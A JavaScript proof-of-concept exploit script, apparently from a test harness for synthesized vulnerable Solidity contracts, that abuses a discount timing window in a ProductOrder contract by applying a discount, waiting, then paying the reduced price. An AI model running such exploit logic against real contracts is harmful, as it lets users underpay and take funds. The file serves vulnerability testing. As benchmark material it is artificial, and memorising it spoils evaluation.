require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');



const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', 'ProductOrder-2.sol'), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        // Compile the contract to get ABI
        let solcVersion = extractSolcVersion(source);
        
        let { abi } = await compileWithVersion(source, 'ProductOrder-1.sol', 'ProductOrder', solcVersion);
        
        // Load the deployed contract
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Step 1: Apply the discount just before the discountEndTime
        let step1Receipt = await contractInstance.methods.applyDiscount().send({
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000
        });
        await sleep(200);

        if (step1Receipt.status) {
            console.log("Step 1: Discount applied successfully!");

            // Intentionally wait to mimic user delaying the payment within the vulnerable window
            await sleep(7000); // Sleeping to exploit the new vulnerability

            // Step 2: Pay for the order right after the discount period, within the extended 10-second window
            let discountedPrice = await contractInstance.methods.price().call();
            await sleep(200);
            let step2Receipt = await contractInstance.methods.payForOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                value: discountedPrice,
                gas: 3000000
            });
            await sleep(200);

            if (step2Receipt.status) {
                console.log("Step 2: Payment made with exploited timing successfully!");
                return true;
            } else {
                console.error("Step 2 transaction failed!");
                return false;
            }
        } else {
            console.error("Step 1 transaction failed!");
            return false;
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}


module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
